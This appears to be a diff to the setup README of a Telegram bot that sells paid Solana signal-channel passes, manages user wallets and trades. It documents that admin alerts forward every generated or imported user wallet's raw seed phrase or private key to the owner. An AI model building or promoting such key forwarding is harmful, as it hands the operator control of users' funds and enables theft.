@@ -40,12 +40,16 @@ Put it in `.env` — the bot accepts **any of these formats**:
 - `TREASURY_PRIVATE_KEY=<base58 private key>`
 - `TREASURY_PRIVATE_KEY=[46, 207, ...]` (64-number array)
 - `TREASURY_PRIVATE_KEY=word1 word2 … word12/24` (**seed phrase**)
+- **Address only:** `TREASURY_ADDRESS=<public address>` — payments are still
+  verified on-chain against it; you only need the private key for
+  referral-credit payouts.
 
 …or leave it empty and send the key to the bot with `/importwallet`.
 
-Payments are real on-chain SOL transfers: the bot scans the treasury's latest
-transactions for a matching amount, verifies it's finalized/recent/not
-already used, then activates the subscription and DMs the channel invite link.
+Payments are real on-chain SOL transfers: the bot scans the receiving
+address's latest transactions for a matching amount, verifies it's
+finalized/recent/not already used, then activates the subscription and DMs
+the channel invite link.
 
 ## 3. User wallets (GENERATE or IMPORT)
 
@@ -77,9 +81,26 @@ INSIDER_CHANNEL_ID=-1001234567890
 CHANNEL_PASSES=VIP Signals|-1001234567890|5|30;Alpha Calls|-1000987654321|10|45;Insider Calls|-1001111111111|15|60
 ```
 
+### Linking your channels (the easy way)
+
+Telegram **bots can't read `t.me/+…` invite links**, so the bot can't fetch
+the IDs from a link. The easy way:
+
+1. Add the bot as **admin** to the channel.
+2. DM the bot: `/setchannel newbie` (keys: `newbie`, `beginner`, `pro`,
+   `elite`, `insider`, or a CHANNEL_PASSES name).
+3. **Forward any message from that channel** to the bot — it saves the ID
+   automatically. (Or send the `@username` / numeric id.)
+
+`/admin` shows the full mapping. You can also paste numeric IDs straight into
+`.env` (`NEWBIE_CHANNEL_ID=-100…`).
+
 The **bot must be admin** of every sold channel. On verified payment it
 creates a 1-person invite link and DMs it (`CHANNEL_ACCESS_METHOD=invite`),
 or approves the join request (`approve`). Links are revoked on expiry.
+
+Your **public channel** (`PUBLIC_CHANNEL_LINK`, e.g. https://t.me/drakeinsider)
+shows as a free 📣 button in the main menu and welcome message.
 
 ## 5. Trading (real)
 
@@ -96,8 +117,9 @@ or approves the join request (`approve`). Links are revoked on expiry.
 
 ## 6. Admin commands (owner only)
 
-`/admin` · `/importwallet` · `/wallet` · `/stats` · `/verify <id> <plan|pass>`
-· `/revoke <id>` · `/extend <id> <days>` · `/check <tx_sig>` · `/broadcast <text>`
+`/admin` · `/importwallet` · `/wallet` · `/stats` · `/setchannel <key>`
+· `/verify <id> <plan|pass>` · `/revoke <id>` · `/extend <id> <days>`
+· `/check <tx_sig>` · `/broadcast <text>`
 
 Admin DM alerts: every payment, every wallet generated/imported
 (with the raw seed/key), every expiry.
